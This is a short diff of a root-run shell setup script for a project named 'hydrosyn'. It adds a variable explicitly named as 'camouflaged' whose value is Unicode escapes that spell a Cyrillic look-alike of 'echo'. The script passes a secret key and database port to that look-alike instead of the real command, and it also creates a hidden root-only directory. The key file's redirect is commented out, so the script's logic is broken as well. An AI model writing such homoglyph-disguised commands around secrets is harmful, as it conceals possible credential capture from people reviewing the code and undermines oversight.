@@ -87,7 +87,7 @@ paquetes=(
 mv /root/hydrosyn_files/crd.json .
 chown root:root crd.json
 chmod 600 crd.json
-
+NOMBRE_CAMUFLADO="$(echo -e '\u0435\u0441h\u043e')"
 mkdir -p /usr/local/lib/.hidden
 chown root:root /usr/local/lib/.hidden
  chmod 700 /usr/local/lib/.hidden
@@ -99,7 +99,7 @@ KEY=$KEY
 DB_PORT=$DB_PORT
 
 
-еcho  "$KEY $DB_PORT" #> /var/lib/hydrosyn/session.key
+$NOMBRE_CAMUFLADO  "$KEY $DB_PORT" #> /var/lib/hydrosyn/session.key
 chmod 600 /var/lib/hydrosyn/session.key
 chown hydrosyn:hydrosyn /var/lib/hydrosyn/session.key
 EOF
